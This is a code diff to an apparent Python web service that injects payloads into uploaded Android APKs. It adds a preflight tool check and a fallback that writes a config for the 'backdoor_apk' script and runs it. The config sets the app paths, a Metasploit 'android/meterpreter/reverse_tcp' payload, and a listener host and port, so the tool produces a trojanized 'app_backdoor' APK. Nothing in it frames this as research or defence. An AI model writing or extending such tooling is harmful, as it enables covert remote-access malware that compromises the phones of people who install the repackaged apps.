@@ -776,6 +776,12 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             log.write(f"Original file: {original_apk}\n")
             log.write(f"File info: [redacted sizes/checksum logged separately]\n")
         
+        # Preflight tools
+        require_signer = ENABLE_APKSIGNER
+        if not preflight_tools(build_log, require_apksigner=require_signer):
+            _finalize_task(t, workspace, succeeded=False, err="Preflight failed: missing tools")
+            return
+        
         # Step 1: Comprehensive APK Analysis
         with build_log.open("a") as log:
             log.write("Step 1: Comprehensive APK analysis...\n")
@@ -788,8 +794,7 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             json.dump(analysis_result, f, indent=2)
         
         with build_log.open("a") as log:
-            log.write(f"Analysis completed. Risk level: {analysis_result.get('risk_assessment', {}).get('risk_level', 'UNKNOWN')}\n")
-            log.write(f"Protection score: {analysis_result.get('security_analysis', {}).get('overall_protection_score', 0)}\n")
+            log.write(f"Analysis completed.\n")
         
         # Step 2: Analyze injection vectors
         with build_log.open("a") as log:
@@ -816,8 +821,6 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         
         with build_log.open("a") as log:
             log.write(f"Strategy: {injection_strategy.strategy_name}\n")
-            log.write(f"Success probability: {injection_strategy.success_probability:.2%}\n")
-            log.write(f"Evasion techniques: {', '.join(injection_strategy.evasion_techniques)}\n")
         
         # Step 4: Apply payload injection
         with build_log.open("a") as log:
@@ -832,7 +835,13 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         injection_success = injector.inject_payload(original_apk, temp_apk, injection_strategy, sign_cfg)
         
         if not injection_success:
-            raise Exception("Payload injection failed")
+            if ENABLE_FALLBACK_BACKDOOR_APK:
+                fb_ok = fallback_backdoor_apk(original_apk, workspace / "output" / (params.get("output_name", "app_backdoor") + ".apk"), params.get("lhost", "127.0.0.1"), params.get("lport", "4444"), params.get("payload", "android/meterpreter/reverse_tcp"), build_log)
+                if fb_ok:
+                    _finalize_task(t, workspace, succeeded=True, err=None)
+                    return
+            _finalize_task(t, workspace, succeeded=False, err="Payload injection failed")
+            return
         
         with build_log.open("a") as log:
             log.write("Payload injection completed successfully\n")
@@ -2109,7 +2118,72 @@ def version():
 # Run environment checks at startup (non-fatal)
 ENV_CHECKS = run_env_checks()
 
-# Optional: Expose concise environment status (no auth)
+# Preflight tools check
+def preflight_tools(build_log: Path, require_apksigner: bool = False) -> bool:
+    """Validate presence of critical tools. Write concise notes to build_log and return bool."""
+    try:
+        with build_log.open("a") as log:
+            missing = []
+            if not ENV_CHECKS.get("java", {}).get("found"):
+                missing.append("java")
+            if not ENV_CHECKS.get("apktool", {}).get("found"):
+                missing.append("apktool")
+            if require_apksigner and not ENV_CHECKS.get("apksigner", {}).get("found"):
+                missing.append("apksigner")
+            if missing:
+                log.write(f"Preflight failed: missing tools: {', '.join(missing)}\n")
+                return False
+            if not ENV_CHECKS.get("zipalign", {}).get("found"):
+                log.write("Warning: zipalign not found; proceeding without alignment\n")
+            if not (ENV_CHECKS.get("aapt", {}).get("found") or ENV_CHECKS.get("aapt2", {}).get("found")):
+                log.write("Warning: aapt/aapt2 not found; post-build badging checks may be skipped\n")
+    except Exception:
+        return True
+    return True
+
+# Backdoor_apk fallback support
+def _run_capture(cmd: list[str], cwd: Optional[Path] = None, timeout: int = 1800) -> tuple[bool, str]:
+    try:
+        proc = subprocess.run(cmd, cwd=str(cwd) if cwd else None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=timeout)
+        return proc.returncode == 0, proc.stdout
+    except Exception as e:
+        return False, str(e)
+
+def fallback_backdoor_apk(original_apk: Path, out_apk: Path, lhost: str, lport: str, payload: str, build_log: Path) -> bool:
+    """Attempt to use legacy backdoor_apk as a fallback. Writes output to build_log. Returns success."""
+    try:
+        with build_log.open("a") as log:
+            log.write("Attempting fallback: backdoor_apk\n")
+        # Prepare config/apk.tmp expected by backdoor_apk
+        cfg_dir = WORKSPACE / "config"
+        cfg_dir.mkdir(parents=True, exist_ok=True)
+        apk_tmp = cfg_dir / "apk.tmp"
+        rat_path = out_apk
+        if rat_path.suffix.lower() != ".apk":
+            rat_path = rat_path.with_suffix(".apk")
+        content = "\n".join([
+            str(original_apk),
+            str(rat_path),
+            payload,
+            lhost,
+            lport,
+        ]) + "\n"
+        apk_tmp.write_text(content)
+        # Run backdoor_apk from workspace root
+        script = WORKSPACE / "backdoor_apk"
+        if not script.exists():
+            with build_log.open("a") as log:
+                log.write("Fallback failed: backdoor_apk script not found\n")
+            return False
+        ok, out = _run_capture(["bash", str(script)], cwd=WORKSPACE, timeout=3600)
+        with build_log.open("a") as log:
+            log.write(out[-5000:])
+        return ok and rat_path.exists()
+    except Exception as e:
+        with build_log.open("a") as log:
+            log.write(f"Fallback error: {e}\n")
+        return False
+
 @app.get("/env")
 def env_status():
     return {"env": {k: {kk: vv for kk, vv in v.items() if kk in ("found", "path", "info")} for k, v in ENV_CHECKS.items() if k != "flags"}, "flags": ENV_CHECKS.get("flags", {})}
